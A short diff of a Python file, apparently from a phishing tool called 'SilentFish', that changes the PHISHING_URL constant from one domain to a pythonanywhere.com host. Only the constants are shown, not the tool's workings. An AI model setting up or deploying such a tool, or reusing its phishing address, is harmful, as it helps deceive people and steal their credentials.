@@ -4,7 +4,7 @@ import time
 import requests
 
 # Constants
-PHISHING_URL = "https://nysquiz.com"
+PHISHING_URL = "https://najafali14.pythonanywhere.com"
 TOOL_NAME = "SilentFish"
 DEVELOPER_INFO = "Developed by: Yamman Butt"
 
